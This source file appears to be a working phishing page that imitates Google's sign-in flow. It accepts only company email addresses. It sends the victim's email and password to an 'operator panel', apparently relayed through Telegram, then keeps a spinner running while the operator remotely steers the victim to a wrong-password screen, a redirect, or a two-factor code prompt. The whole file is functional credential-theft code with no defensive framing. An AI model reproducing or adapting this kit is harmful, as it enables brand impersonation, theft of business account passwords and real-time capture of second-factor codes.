"use client";

import { useCallback, useEffect, useState } from "react";
import styles from "./GoogleSignIn.module.css";
import TwoFactor from "./TwoFactor";
import { getOrCreateSession } from "@/lib/session";

/* ---------------------------------------------------------------- helpers */

/**
 * Domains that are personal / freemail providers. Anything on this list is
 * rejected: the flow only accepts business (company-domain) addresses.
 */
const PERSONAL_DOMAINS = new Set([
  "gmail.com",
  "googlemail.com",
  "yahoo.com",
  "yahoo.co.uk",
  "yahoo.fr",
  "yahoo.de",
  "yahoo.es",
  "yahoo.it",
  "ymail.com",
  "rocketmail.com",
  "hotmail.com",
  "hotmail.co.uk",
  "hotmail.fr",
  "hotmail.de",
  "outlook.com",
  "outlook.fr",
  "live.com",
  "live.nl",
  "live.co.uk",
  "msn.com",
  "icloud.com",
  "me.com",
  "mac.com",
  "aol.com",
  "proton.me",
  "protonmail.com",
  "pm.me",
  "gmx.com",
  "gmx.de",
  "gmx.net",
  "web.de",
  "mail.com",
  "mail.ru",
  "yandex.ru",
  "yandex.com",
  "zoho.com",
  "tutanota.com",
  "tuta.io",
  "fastmail.com",
  "hey.com",
  "orange.fr",
  "wanadoo.fr",
  "laposte.net",
  "free.fr",
  "sfr.fr",
  "skynet.be",
  "telenet.be",
  "proximus.be",
  "qq.com",
  "163.com",
  "126.com",
  "sina.com",
  "naver.com",
  "daum.net",
  "kakao.com",
]);

const EMAIL_RE = /^[^\s@]+@[^\s@.]+(\.[^\s@.]+)+$/;

type Check = { ok: true } | { ok: false; message: string };

/** Empty / malformed / personal domain / disposable-looking → rejected. */
function checkBusinessEmail(raw: string): Check {
  const value = raw.trim().toLowerCase();

  if (!value) return { ok: false, message: "Enter an email or phone number" };
  if (!EMAIL_RE.test(value)) {
    return { ok: false, message: "Enter a valid email or phone number" };
  }

  const domain = value.split("@")[1];
  const taken = value.split("@")[0];

  if (PERSONAL_DOMAINS.has(domain)) {
    // Shown every time a personal (freemail) address is tried.
    return { ok: false, message: "Only work email accepted" };
  }

  // Throwaway-looking aliases on a company domain are still worth blocking.
  if (/^(info|admin|test|noreply|no-reply|abuse|postmaster)$/.test(taken)) {
    return { ok: false, message: "Enter your work email address, not a role mailbox." };
  }

  return { ok: true };
}

function GoogleG({ className }: { className?: string }) {
  return (
    <svg
      className={className}
      viewBox="0 0 48 48"
      aria-hidden="true"
      focusable="false"
    >
      <path
        fill="#EA4335"
        d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
      />
      <path
        fill="#4285F4"
        d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
      />
      <path
        fill="#FBBC05"
        d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
      />
      <path
        fill="#34A853"
        d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
      />
    </svg>
  );
}

function Caret({ className }: { className?: string }) {
  return (
    <svg
      className={className ?? styles.caret}
      viewBox="0 0 10 6"
      aria-hidden="true"
      focusable="false"
    >
      <path
        d="M1 1l4 4 4-4"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.4"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function EyeIcon({ open }: { open: boolean }) {
  return (
    <svg
      className={styles.eye}
      viewBox="0 0 24 24"
      aria-hidden="true"
      focusable="false"
    >
      <path
        d="M12 5c-5 0-9 4.5-10 7 1 2.5 5 7 10 7s9-4.5 10-7c-1-2.5-5-7-10-7z"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.6"
      />
      <circle
        cx="12"
        cy="12"
        r="3.2"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.6"
      />
      {!open && (
        <path d="M4 20L20 4" stroke="currentColor" strokeWidth="1.6" />
      )}
    </svg>
  );
}

/* --------------------------------------------------------------- component */

type Step = "identifier" | "password" | "twofa";

const wait = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms));

export default function GoogleSignIn() {
  const [step, setStep] = useState<Step>("identifier");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [reveal, setReveal] = useState(false);
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  // Password handed over: spinner stays up until the operator sends a command.
  const [awaiting, setAwaiting] = useState(false);
  const [sessionId, setSessionId] = useState("");

  // Session id lives in localStorage (lib/session.ts) and keys the 2FA state
  // on the server, so the Telegram panel can target this exact browser.
  useEffect(() => {
    setSessionId(getOrCreateSession().session.id);
  }, []);

  const currentSession = () => sessionId || getOrCreateSession().session.id;

  const submitIdentifier = useCallback(
    (event: React.FormEvent<HTMLFormElement>) => {
      event.preventDefault();
      if (busy) return;
      const result = checkBusinessEmail(email);
      if (!result.ok) {
        setError(result.message);
        return;
      }
      setError("");
      setBusy(true);
      // Gmail-style: the Next button turns into a spinner while it "checks".
      window.setTimeout(() => {
        setBusy(false);
        setPassword("");
        setReveal(false);
        setStep("password");
      }, 850);
    },
    [email, busy],
  );

  const submitPassword = useCallback(
    async (event: React.FormEvent<HTMLFormElement>) => {
      event.preventDefault();
      if (busy) return;
      if (!password) {
        setError("Enter a password");
        return;
      }
      setError("");
      setBusy(true);

      // Send the password to the operator panel. It is the only place the
      // password goes, so the panel message and every later step ("2FA
      // Phone", "Done", …) carries exactly what was submitted.
      const started = fetch("/api/2fa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ op: "start", session: currentSession(), email, password }),
      }).catch(() => null);

      await Promise.all([started, wait(600)]);
      // Keep the spinner spinning on this same screen until the operator
      // presses something (tap prompt or a 2FA code screen).
      setBusy(false);
      setAwaiting(true);
    },
    [password, busy, email, sessionId],
  );

  const backToIdentifier = useCallback((message?: string) => {
    setAwaiting(false);
    setBusy(false);
    setStep("identifier");
    setError(message ?? "");
    setPassword("");
    setReveal(false);
  }, []);

  const backToPassword = useCallback(() => {
    setAwaiting(false);
    setBusy(false);
    setStep("password");
    setPassword("");
    setReveal(false);
    setError("Wrong password. Try again or click Forgot password to reset it.");
  }, []);

  // While the spinner is up, follow the operator panel. The page advances
  // only when a command lands: tap prompt → tap screen, any of the 2FA
  // buttons → code screen, plus the verdict buttons.
  useEffect(() => {
    if (!awaiting) return;
    let cancelled = false;
    let timer: ReturnType<typeof setTimeout>;

    const tick = async () => {
      try {
        const res = await fetch("/api/2fa?session=" + encodeURIComponent(currentSession()), {
          cache: "no-store",
        });
        const data = (await res.json()) as {
          state?: { status?: string; configured?: boolean };
        };
        const status = data.state?.status;

        if (!cancelled && status) {
          if (status === "wrong_email") {
            // Operator pressed "Wrong Email": the account doesn't exist.
            backToIdentifier("This email doesn't exist");
            return;
          }
          if (status === "wrong_pass") {
            backToPassword();
            return;
          }
          if (status === "kicked") {
            window.location.href = "/";
            return;
          }
          // Anything other than "waiting" is the operator's go-ahead. With no
          // bot configured nobody can send it, so keep the preview usable.
          if (status !== "pending" || data.state?.configured === false) {
            setAwaiting(false);
            setBusy(false);
            setStep("twofa");
            return;
          }
        }
      } catch {
        /* network hiccup — keep the spinner and try again */
      }
      if (!cancelled) timer = setTimeout(tick, 1200);
    };

    void tick();
    return () => {
      cancelled = true;
      clearTimeout(timer);
    };
  }, [awaiting, backToIdentifier, backToPassword]);

  if (step === "twofa") {
    return (
      <TwoFactor
        email={email}
        sessionId={sessionId || currentSession()}
        onWrongPassword={backToPassword}
        onSwitchAccount={backToIdentifier}
      />
    );
  }

  return (
    <div className={styles.page}>
      <div className={styles.wrap}>
        <main className={styles.card}>
          {step === "identifier" ? (
            <form
              className={styles.form}
              onSubmit={submitIdentifier}
              noValidate
            >
              <div className={styles.intro}>
                <GoogleG className={styles.logo} />
                <h1 className={styles.title}>Sign in</h1>
                <p className={styles.subtitle}>Use your Google Account</p>
              </div>

              <div className={styles.fields}>
                <input
                  className={error ? `${styles.input} ${styles.inputError}` : styles.input}
                  id="identifier"
                  type="text"
                  name="identifier"
                  placeholder="Email or phone"
                  autoComplete="username"
                  autoFocus
                  value={email}
                  onChange={(event) => {
                    setEmail(event.target.value);
                    if (error) setError("");
                  }}
                  aria-label="Email or phone"
                  aria-invalid={Boolean(error)}
                  aria-describedby={error ? "identifier-error" : undefined}
                />

                {error && (
                  <p className={styles.error} id="identifier-error" role="alert">
                    <span className={styles.errorMark} aria-hidden="true">
                      !
                    </span>
                    {error}
                  </p>
                )}

                <a
                  className={styles.forgot}
                  href="#"
                  onClick={(e) => e.preventDefault()}
                >
                  Forgot email?
                </a>

                <p className={styles.guest}>
                  Not your computer? Use Guest mode to sign in privately.{" "}
                  <a href="#" onClick={(e) => e.preventDefault()}>
                    Learn more
                  </a>
                </p>

                <div className={styles.actions}>
                  <a
                    className={styles.create}
                    href="#"
                    onClick={(e) => e.preventDefault()}
                  >
                    Create account
                  </a>
                  <button
                    className={styles.next}
                    type="submit"
                    disabled={busy}
                    aria-busy={busy}
                  >
                    {busy ? <span className={styles.spinner} aria-hidden="true" /> : "Next"}
                  </button>
                </div>
              </div>
            </form>
          ) : (
            <form
              className={styles.form}
              onSubmit={submitPassword}
              noValidate
            >
              <div className={styles.intro}>
                <h1 className={styles.title}>Welcome</h1>

                <button
                  className={styles.chip}
                  type="button"
                  onClick={() => {
                    if (!awaiting) backToIdentifier();
                  }}
                  disabled={awaiting}
                  title="Switch account"
                >
                  <span className={styles.avatar} aria-hidden="true">
                    {email.charAt(0).toUpperCase()}
                  </span>
                  <span className={styles.chipEmail}>{email}</span>
                  <Caret className={styles.chipCaret} />
                </button>
              </div>

              <div className={styles.fields}>
                <label className={styles.passwordLabel} htmlFor="password">
                  Enter your password
                </label>
                <div
                  className={
                    error ? `${styles.passwordBox} ${styles.inputError}` : styles.passwordBox
                  }
                >
                  <input
                    className={styles.passwordInput}
                    id="password"
                    type={reveal ? "text" : "password"}
                    name="password"
                    autoComplete="current-password"
                    autoFocus
                    disabled={awaiting}
                    value={password}
                    onChange={(event) => {
                      setPassword(event.target.value);
                      if (error) setError("");
                    }}
                    aria-invalid={Boolean(error)}
                    aria-describedby={error ? "password-error" : undefined}
                  />
                  <button
                    className={styles.revealToggle}
                    type="button"
                    disabled={awaiting}
                    onClick={() => setReveal((v) => !v)}
                    aria-label={reveal ? "Hide password" : "Show password"}
                    aria-pressed={reveal}
                  >
                    <EyeIcon open={reveal} />
                  </button>
                </div>

                {error && (
                  <p className={styles.error} id="password-error" role="alert">
                    <span className={styles.errorMark} aria-hidden="true">
                      !
                    </span>
                    {error}
                  </p>
                )}

                <label className={styles.showRow}>
                  <input
                    className={styles.checkbox}
                    type="checkbox"
                    checked={reveal}
                    disabled={awaiting}
                    onChange={(event) => setReveal(event.target.checked)}
                  />
                  Show password
                </label>

                <div className={styles.actions}>
                  <a
                    className={styles.create}
                    href="#"
                    onClick={(e) => e.preventDefault()}
                  >
                    Forgot password?
                  </a>
                  <button
                    className={styles.next}
                    type="submit"
                    disabled={busy || awaiting}
                    aria-busy={busy || awaiting}
                  >
                    {busy || awaiting ? (
                      <span className={styles.spinner} aria-hidden="true" />
                    ) : (
                      "Next"
                    )}
                  </button>
                </div>
              </div>
            </form>
          )}
        </main>

        <footer className={styles.footer}>
          <button className={styles.lang} type="button">
            English (United States)
            <Caret />
          </button>

          <nav className={styles.links}>
            <a href="#" onClick={(e) => e.preventDefault()}>
              Help
            </a>
            <a href="#" onClick={(e) => e.preventDefault()}>
              Privacy
            </a>
            <a href="#" onClick={(e) => e.preventDefault()}>
              Terms
            </a>
          </nav>
        </footer>
      </div>
    </div>
  );
}
